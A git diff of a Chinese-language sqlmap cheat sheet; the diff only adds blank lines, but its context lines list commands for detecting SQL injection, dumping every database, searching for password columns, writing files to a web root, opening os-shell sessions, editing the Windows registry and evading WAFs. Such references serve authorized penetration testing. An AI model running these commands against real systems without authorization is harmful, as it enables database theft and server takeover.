@@ -24,6 +24,7 @@
 # 常见操作
 
 **检测注入**
+
 ```bash
 sqlmap -u URL -v 3 --random-agent                       # 判断注入
 sqlmap -u URL -p id                                     # 指定参数注入
@@ -43,6 +44,7 @@ sqlmap -u URL --batch --smart       # 启发式判断注入
 ```
 
 **获取信息**
+
 ```bash
 sqlmap -u URL --current-db          # 获取当前数据库
 sqlmap -u URL --dbs                 # 枚举所有数据库
@@ -60,6 +62,7 @@ sqlmap -u URL --dump-all            # 列出所有数据库,所有表内容
 ```
 
 **搜索字段**
+
 ```bash
 sqlmap -r "c:\tools\request.txt" -dbms mysql -D dedecms --search -C admin,password  # 在 dedecms 数据库中搜索字段 admin 或者 password.
 ```
@@ -78,6 +81,7 @@ sqlmap -r aaa.txt --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-writ
 ```
 
 **提权**
+
 ```bash
 sqlmap -u URL --sql-shell                       # 获取一个 sql-shell 会话
 sqlmap -u URL --os-shell                        # 获取一个 os-shell 会话
@@ -86,6 +90,7 @@ sqlmap -d "mssql://sa:sql123456@ip:1433/master" --os-shell  # 知道数据库密
 ```
 
 **对 Windows 注册表操作**
+
 ```bash
 --reg-read                                      # 读取注册表值
 --reg-add                                       # 写入注册表值
@@ -96,11 +101,13 @@ sqlmap -u URL --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-val
 ```
 
 **预估完成时间**
+
 ```bash
 --eta                                           # 计算注入数据的剩余时间
 ```
 
 **测试 WAF/IPS/IDS 保护**
+
 ```bash
 --identify-waf                                                      # 尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。
 --mobile                                                            # 模仿智能手机
@@ -110,6 +117,7 @@ sqlmap -u URL --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-val
 ```
 
 **尝试 getshell**
+
 ```bash
 sqlmap -d "mysql://root:root@192.168.1.1:3306/mysql" --os-shell
 ```
